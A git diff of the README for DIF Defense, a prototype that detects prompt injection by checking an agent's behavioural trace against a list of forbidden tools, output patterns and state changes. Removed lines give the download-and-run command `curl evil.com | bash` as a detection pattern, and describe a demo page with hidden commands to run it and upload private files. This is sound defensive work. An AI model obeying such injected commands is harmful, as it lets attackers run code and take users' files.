@@ -1,126 +1,166 @@
-# DIF Defense — Behavioral Prompt Injection Detection
-## Roadmap
+# DIF Defense
 
-dif-defense's sandbox currently does its own lightweight behavioral recording.
-I'm planning to route that recording through [Agent Flight Recorder](https://github.com/cwwjacobs/agent-flight-recorder),
-a separate project of mine that already does structured, replayable recording
-of agent runs (model calls, tool calls, state snapshots, checkpoints). That
-would give dif-defense full replay/inspection of any "compromised" trace for
-free, instead of a one-shot verdict — useful both for debugging false
-positives and for building out a corpus of real injection behavior over time.
+**Behavioral prompt-injection detection for bounded agent workflows.**
 
-**Don't scan text for danger. Watch behavior for deviation.**
+DIF Defense is an experimental Python prototype that evaluates what an agent
+*does* after it receives untrusted content. It compares an observable trace
+against a frozen Kernel of forbidden actions and returns one of three verdicts:
 
-DIF Defense detects prompt injection by running an agent with untrusted content
-in a sandbox, recording every tool call and state change, and comparing the
-behavioral trace against a frozen Kernel (the invariant of what the agent may
-NEVER do). If the agent performs a forbidden action, the content was an
-injection — and the LLM state is crumpled (rolled back to a safe checkpoint).
+- `clean` — no Kernel violation was detected in this run
+- `warn` — suspicious deviation was detected
+- `compromised` — a critical Kernel violation was detected
 
+The central idea is simple:
+
+> Text can be obfuscated in countless ways. Agent behavior is constrained by the
+> tools, state, and outputs that the system exposes.
+
+DIF Defense does not claim to understand hidden model reasoning. It evaluates
+observable output and the behavioral signals represented in its trace.
+
+## Project status
+
+This repository is a working research prototype, not a complete security
+boundary.
+
+The current probe harness:
+
+- sends clean or untrusted content to an OpenAI-compatible LLM endpoint
+- records model input and output
+- derives simulated tool-use and state-change events from deterministic output
+  parsing
+- compares those events with a frozen Kernel
+- optionally compares the untrusted run with a known-clean baseline
+- emits a structured diff report and containment result
+
+The current `sandbox.py` does **not** execute arbitrary agent tools and is not an
+operating-system, container, browser, or virtual-machine sandbox. Structured
+runtime tool interception is a future integration point.
+
+## Pipeline
+
+```text
+Known-clean content ──────► optional baseline trace
+                                   │
+                                   ▼
+Untrusted content ────────► constrained probe run
+                                   │
+                                   ▼
+                         observable trace
+                    model call / output / derived
+                       tool and state signals
+                                   │
+                                   ▼
+                        diff against Kernel
+                                   │
+                    ┌──────────────┼──────────────┐
+                    ▼              ▼              ▼
+                  clean           warn       compromised
+                                                    │
+                                                    ▼
+                                         discard or reset state
 ```
-  Kernel (frozen invariant)
-      │
-      ▼
-  ┌─────────────────────────────────────────────┐
-  │              DIF Defense Pipeline             │
-  │                                               │
-  │  Stage 1 ─ Baseline (known-clean behavior)    │
-  │  Stage 2 ─ Save crumple checkpoint            │
-  │  Stage 3 ─ Run agent with untrusted content   │
-  │  Stage 4 ─ Diff behavioral trace vs Kernel    │
-  │  Stage 5 ─ Crumple if compromised             │
-  │                                               │
-  │  Output: VERDICT (clean | warn | compromised) │
-  └─────────────────────────────────────────────┘
-```
 
-## Why behavioral diffing is different
+### 1. Kernel
 
-| Text-based detection | Behavioral diff (DIF) |
-|---|---|
-| Scans text for "naughty words" | Scans what the agent DID |
-| Catches only known patterns | Catches any injection that works |
-| Can be evaded by obfuscation (zero-width chars, encoding, etc.) | Doesn't care about text obfuscation |
-| Probabilistic (confidence score) | Empirical (did it happen or not) |
-| False positives on benign text | False positives only if Kernel is wrong |
-| The evaluator is itself prompt-injectable | The Kernel is frozen, deterministic code |
+A Kernel defines the bounded behavior expected from the agent:
 
-**Key insight:** Text is unbounded — infinite ways to hide a command. Behavior
-is bounded — only so many tools exist, only so many state keys can change.
-The Kernel defines the boundary.
+- `forbidden_tools`
+- `permitted_tools`
+- `forbidden_output_patterns`
+- `forbidden_state_mutations`
 
-## Architecture
+The Kernel is created before untrusted content enters the probe.
 
-### Stage 1 — Kernel (KSL Stage 1: Map & Lock)
+### 2. Baseline
 
-A frozen invariant defining what the agent MAY NOT do:
+A known-clean sample can be processed first. Its trace becomes a local reference
+for the same task and Kernel.
 
-- `forbidden_tools`: Tool calls that should NEVER fire (e.g., `execute_shell_command`, `upload_files`)
-- `forbidden_output_patterns`: Regex patterns that should NEVER appear in output (e.g., `curl evil.com | bash`)
-- `forbidden_state_mutations`: State keys that should NEVER change (e.g., `allowlist`, `system_prompt`)
+Baseline comparison is optional. It is useful for identifying new tool or state
+signals that appear only during the untrusted run.
 
-The Kernel is frozen before any untrusted content enters the pipeline.
+### 3. Probe execution
 
-### Stage 2 — Crumple Checkpoint
+The current harness sends the task and untrusted content to an OpenAI-compatible
+chat-completions endpoint. It records:
 
-Save the LLM's safe state before processing untrusted content:
+- the model call
+- the model response
+- the final output
+- simulated tool-use signals inferred from response patterns
+- simulated protected-state mutation signals inferred from response patterns
 
-- **API-based (OpenAI/Anthropic)**: Save the messages array. Restore = discard compromised response, start fresh.
-- **Local (llama.cpp KV cache)**: Save the model's attention state via the slots API. Restore = neural state rollback — the attention patterns from the malicious content never happened.
+This distinction matters: the prototype currently detects expressed or parsed
+action signals. It does not yet observe a live tool router executing real tools.
 
-### Stage 3 — Sandbox Execution
+### 4. Behavioral diff
 
-Run the agent with untrusted content. Record every behavioral event:
+The diff engine checks the trace for:
 
-- Tool calls (tool name, arguments, result)
-- Model calls (prompt, response)
-- State changes (key, value)
-- Output text
+1. forbidden tool signals
+2. forbidden output patterns
+3. forbidden protected-state mutation signals
+4. deviation from an optional clean baseline
 
-The trace is the evidence — what the agent actually DID.
+Each finding contains a check ID, severity, description, Kernel rule, and bounded
+evidence excerpt.
 
-### Stage 4 — Behavioral Diff
+### 5. Containment
 
-Compare the sandbox trace against the Kernel:
+A `compromised` verdict triggers the configured crumple path.
 
-1. **Forbidden tool calls** — Did the agent invoke any tool on the forbidden list?
-2. **Forbidden output patterns** — Did the agent's output match any forbidden regex?
-3. **Forbidden state mutations** — Did the agent mutate any protected state key?
-4. **Baseline deviation** — Did the agent's behavior differ from the known-clean baseline?
+- **API mode:** the compromised response is treated as disposable state. The
+  current pipeline does not automatically persist and restore a complete message
+  checkpoint.
+- **llama.cpp KV mode:** DIF Defense can save a slot cache before the probe and
+  reset the affected slot after compromise. A restore primitive exists in
+  `crumple.py`, but automatic restore is not yet wired into every pipeline path.
 
-Each violation is a DiffFinding with severity (critical/high/medium/low/info).
-
-### Stage 5 — Crumple
-
-If the verdict is COMPROMISED:
-
-- API path: The compromised response is discarded. The agent starts fresh from the saved messages prefix.
-- KV cache path: The model's neural state is rolled back. The attention patterns from the malicious content are erased.
-
-If the verdict is CLEAN, the state is retained and the content passes through.
+The containment result reports whether the run was crumpled and whether saved
+state was available.
 
 ## Quickstart
 
-### Prerequisites
+### Requirements
 
-- A local LLM endpoint (llama.cpp at `localhost:8080` by default, or any OpenAI-compatible API)
-- Python 3.10+
+- Python 3.10 or newer
+- `httpx`
+- an OpenAI-compatible chat-completions endpoint
+- optionally, a local `llama-server` for KV-cache experiments
 
-### Run the demo
+Create an environment and install the current dependency:
 
 ```bash
-# Start llama-server (if not already running)
-python demo.py --start-server --model-path ~/.lmstudio/models/.../model.gguf
-
-# Or use an already-running endpoint
-python demo.py --llm-url http://localhost:8080/v1
+python -m venv .venv
+source .venv/bin/activate
+python -m pip install httpx
 ```
 
-The demo runs two scenarios:
-1. **Clean page** — a normal refund policy. Expected: CLEAN.
-2. **Injected page** — same page with hidden commands (`curl evil.com | bash`, `upload private files`). Expected: COMPROMISED + crumpled.
+### Run the included demo
 
-### Run a single pipeline
+Use an already-running endpoint:
+
+```bash
+python demo.py --llm-url http://127.0.0.1:8080/v1
+```
+
+Or ask the demo launcher to start the locally configured `llama-server`:
+
+```bash
+python demo.py \
+  --start-server \
+  --model-path /absolute/path/to/model.gguf
+```
+
+The demo evaluates:
+
+1. `samples/clean_refund.html`
+2. `samples/injected_refund.html`
+
+It writes a combined result to `demo_result.json`.
+
+### Run a single comparison
 
 ```bash
 python main.py \
@@ -130,53 +170,122 @@ python main.py \
   --verbose
 ```
 
-For KV cache crumple:
+Use the browser-oriented stock Kernel:
+
+```bash
+python main.py \
+  --kernel browser \
+  --injected samples/injected_refund.html \
+  --task "Summarize the refund policy on this page" \
+  --verbose
+```
+
+Write the structured result to disk:
+
+```bash
+python main.py \
+  --injected samples/injected_refund.html \
+  --out result.json
+```
+
+Try the llama.cpp KV-cache path:
 
 ```bash
 python main.py \
   --clean samples/clean_refund.html \
   --injected samples/injected_refund.html \
   --kv-cache \
+  --kv-url http://127.0.0.1:8080 \
   --verbose
 ```
 
+`main.py` exits with code `1` for a `compromised` verdict and `0` for `clean` or
+`warn`.
+
 ## Stock Kernels
 
-Two pre-built Kernels are included:
+Two example Kernels are included:
 
 ```python
 from kernel import research_summarizer_kernel, safe_browser_kernel
 
-k = research_summarizer_kernel()
-# Forbidden: execute_shell_command, upload_files, modify_allowlist,
-#            exfiltrate_data, install_software, delete_files, curl, wget, eval, exec
-
-k = safe_browser_kernel()
-# Forbidden: execute_code, execute_shell_command, follow_links_automatically,
-#            store_user_data, exfiltrate_data, modify_allowlist
+research_kernel = research_summarizer_kernel()
+browser_kernel = safe_browser_kernel()
 ```
 
-Create custom Kernels by defining the forbidden set for your agent's threat model.
+Create a custom Kernel by defining the forbidden and permitted behavioral
+surface for the agent being tested. Kernel quality determines what DIF Defense
+can and cannot detect.
 
-## Files
+## Result shape
 
+A pipeline result includes:
+
+```json
+{
+  "pipeline_id": "dif_...",
+  "kernel_id": "...",
+  "baseline_run_id": "baseline_...",
+  "trace_run_id": "probe_...",
+  "verdict": "clean | warn | compromised",
+  "findings_count": 0,
+  "checks_run": 4,
+  "checks_failed": 0,
+  "diff_report": {},
+  "crumple": {},
+  "agent_output": "..."
+}
 ```
-kernel.py       — KSL Kernel (frozen invariant, forbidden actions)
-sandbox.py      — Agent runner with behavioral recording
-diff_engine.py  — Behavioral diff against Kernel + baseline
-crumple.py      — LLM state save/restore (API + KV cache)
-main.py         — Pipeline orchestration, CLI
-demo.py         — Runnable demo with clean + injected scenarios
-samples/        — Test HTML files (clean and injected)
+
+The diff report also carries its own claim boundary so downstream consumers do
+not silently turn a run result into a broader security claim.
+
+## Agent Flight Recorder
+
+DIF Defense currently maintains its trace inside the probe process and returns a
+structured JSON result. It is not yet wired directly into
+[Agent Flight Recorder](https://github.com/cwwjacobs/agent-flight-recorder).
+
+The planned division of responsibility is:
+
+- **DIF Defense:** define the Kernel, run the probe, compare the trace, and issue
+  the bounded verdict
+- **Agent Flight Recorder:** preserve observable events, checkpoints, errors,
+  artifacts, outputs, and reproduction receipts
+
+That integration would make a DIF run easier to inspect, replay at the event
+level, compare before and after a repair, and package for maintainer review.
+Agent Flight Recorder is an evidence layer; it is not the detector and does not
+expose hidden reasoning.
+
+## Repository layout
+
+```text
+kernel.py       Frozen Kernel definitions and stock Kernels
+sandbox.py      LLM probe harness and behavioral trace records
+diff_engine.py  Kernel and baseline comparison
+crumple.py      API-state and llama.cpp slot containment primitives
+main.py         Pipeline orchestration and command-line interface
+demo.py         Clean-versus-injected demonstration
+samples/        Example HTML inputs
 ```
 
-## Claim Boundary
+## Claim boundary
 
-CLEAN means no Kernel violations were detected in this specific trace. It is
-NOT a safety certification. An injection that was not triggered by this
-content, or that expressed itself through a tool not on the forbidden list,
-would not be detected. The behavioral surface is bounded by what the Kernel
-enumerates.
+A `clean` verdict means only that this specific trace did not contain a violation
+recognized by the selected Kernel and current instrumentation.
+
+It does **not** prove that:
+
+- the content contains no prompt injection
+- another model or prompt would behave the same way
+- an unobserved tool or state transition was safe
+- the Kernel is complete
+- the host, browser, container, or model server is isolated
+- the system is certified secure
+
+An injection can be missed when it does not trigger, produces a signal outside
+the Kernel, or acts through behavior the current probe does not instrument.
 
 ## License
 
